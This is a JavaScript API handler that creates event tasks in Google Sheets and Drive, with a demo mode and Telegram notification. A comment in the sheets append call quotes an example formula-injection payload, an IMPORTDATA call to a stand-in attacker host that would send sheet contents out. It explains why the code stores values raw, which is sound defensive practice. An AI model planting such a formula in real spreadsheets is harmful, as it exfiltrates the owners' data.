import { requirePassword } from '../../lib/auth.mjs';
import { addDemoTask, demoDriveUrl, demoStatus } from '../../lib/demo.mjs';
import { getGoogleClients } from '../../lib/google.mjs';
import { notifyTaskCreated } from '../../lib/telegram.mjs';
import { validateTaskInput } from '../../lib/validate.mjs';
import { json, methodNotAllowed, readJsonObject, serverError } from '../../lib/http.mjs';

export default async function handler(req) {
  if (req.method !== 'POST') return methodNotAllowed('POST');

  const demo = demoStatus();
  if (demo.refusal) return demo.refusal;

  if (!demo.active) {
    const unauthorized = requirePassword(req);
    if (unauthorized) return unauthorized;
  }

  const body = await readJsonObject(req);
  if (!body.ok) return json(400, { status: 'error', message: body.message });

  const input = validateTaskInput(body.value);
  if (!input.ok) return json(400, { status: 'error', message: input.message });

  const { taskName, formUrl, eventDate, eventLocation, eventOneLiner } = input.value;

  const taskId = `TASK-${Date.now()}`;
  const createdAt = new Date().toISOString();
  const targetFormUrl = formUrl || 'https://forms.google.com';
  const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(targetFormUrl)}`;

  // Validation above has already run, so a contributor exercising the demo is
  // exercising the real request contract. Only the side effects are replaced.
  if (demo.active) {
    const driveUrl = demoDriveUrl(taskId);

    const stored = addDemoTask({
      taskId,
      taskName,
      status: 'Pending',
      driveUrl,
      qrUrl: qrCodeUrl,
      createdAt,
      eventDate,
      eventLocation,
      eventOneLiner,
    });

    return json(200, {
      status: 'success',
      taskId,
      driveUrl,
      qrCodeUrl,
      createdAt,
      message: stored
        ? 'Demo mode: saved to your local demo only. Nothing was written to Google or Telegram.'
        : 'Demo mode: this shared demo is read-only, so the task was not added to the list. Nothing was written to Google or Telegram.',
    });
  }

  let sheets;
  let drive;
  try {
    ({ sheets, drive } = getGoogleClients());
  } catch (error) {
    return serverError('create-task: Google credentials', error);
  }

  const sheetRow = [
    taskId,
    taskName,
    'Pending',
    '',
    qrCodeUrl,
    createdAt,
    eventDate,
    eventLocation,
    eventOneLiner,
  ];

  try {
    await sheets.spreadsheets.values.append({
      spreadsheetId: process.env.GOOGLE_SHEET_ID,
      range: 'Tasks!A:I',
      // RAW, not USER_ENTERED: a task name like =IMPORTDATA("https://evil.tld/?"&A1)
      // would otherwise be stored as a live formula and exfiltrate the sheet.
      valueInputOption: 'RAW',
      requestBody: { values: [sheetRow] },
    });
  } catch (error) {
    console.error('create-task: sheets append failed:', error.message);
    return json(502, { status: 'error', message: 'Could not save the task to the sheet database.' });
  }

  // Drive and Telegram are best-effort: the task is already recorded.
  let driveUrl = '';
  let folderId = '';

  try {
    const folder = await drive.files.create({
      requestBody: {
        name: `Project - ${taskName}`,
        mimeType: 'application/vnd.google-apps.folder',
        parents: process.env.GOOGLE_DRIVE_PARENT_FOLDER_ID
          ? [process.env.GOOGLE_DRIVE_PARENT_FOLDER_ID]
          : [],
      },
      fields: 'id, webViewLink',
    });

    folderId = folder.data.id;
    driveUrl = folder.data.webViewLink ?? '';
  } catch (error) {
    console.error('create-task: drive folder creation failed:', error.message);
  }

  if (process.env.WDS_INTRO_DOC_ID && folderId) {
    try {
      await drive.files.copy({
        fileId: process.env.WDS_INTRO_DOC_ID,
        requestBody: { name: `${taskName} - WDS Intro Slides`, parents: [folderId] },
      });
    } catch (error) {
      console.error('create-task: intro slide copy failed:', error.message);
    }
  }

  await notifyTaskCreated({ taskName, driveUrl });

  return json(200, {
    status: 'success',
    taskId,
    driveUrl,
    qrCodeUrl,
    createdAt,
    message: driveUrl
      ? 'Task created successfully.'
      : 'Task saved to the sheet, but the Drive folder could not be created.',
  });
}
